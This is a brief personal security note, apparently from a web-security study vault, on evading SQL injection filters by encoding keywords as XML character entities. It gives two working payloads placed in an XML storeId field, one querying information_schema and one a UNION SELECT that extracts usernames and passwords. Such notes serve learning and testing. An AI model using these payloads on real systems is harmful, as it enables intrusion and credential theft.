---
tags:
  - security
  - web
---
A way to bypass simple [[SQL Injection|SQLI]] filtering by using [[XML Numeric Character Reference|Decimal Entities]]
```
<stockCheck> 
<productId>123</productId> 
<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId> 
</stockCheck>
```

# Example Payload with [[Hackvertor]]
```
<storeId><@hex_entities
>1 UNION SELECT username || '~' || password FROM users
></@hex_entities></storeId>
```